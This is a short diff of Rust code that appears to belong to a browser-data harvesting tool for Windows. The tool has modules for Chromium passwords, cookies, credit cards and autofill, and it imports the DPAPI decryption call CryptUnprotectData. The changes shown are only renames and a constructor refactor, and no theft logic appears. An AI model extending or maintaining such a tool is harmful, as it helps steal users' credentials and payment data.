@@ -1,7 +1,7 @@
 mod autofill;
 mod bookmarks;
 mod cookies;
-mod creditcards;
+mod credit_cards;
 mod downloads;
 mod history;
 mod passwords;
@@ -9,7 +9,7 @@ mod passwords;
 use crate::chromium::autofill::AutoFillTask;
 use crate::chromium::bookmarks::BookmarksTask;
 use crate::chromium::cookies::CookiesTask;
-use crate::chromium::creditcards::CreditCardsTask;
+use crate::chromium::credit_cards::CreditCardsTask;
 use crate::chromium::downloads::DownloadsTask;
 use crate::chromium::history::HistoryTask;
 use crate::chromium::passwords::PasswordsTask;
@@ -38,12 +38,12 @@ use windows_sys::Win32::Security::Cryptography::{
     BCryptSetProperty, CRYPT_INTEGER_BLOB, CryptUnprotectData,
 };
 
-pub struct ChromiumTask<'a, C: Collector, F: FileSystem> {
+pub(crate) struct ChromiumTask<'a, C: Collector, F: FileSystem> {
     tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask<C, F>)>,
 }
 
-impl<C: Collector, F: FileSystem> ChromiumTask<'_, C, F> {
-    pub(crate) fn new() -> Self {
+impl<C: Collector + 'static, F: FileSystem + 'static> Default for ChromiumTask<'_, C, F> {
+    fn default() -> Self {
         let all_browsers = get_chromium_browsers();
         let mut tasks = vec![];
 
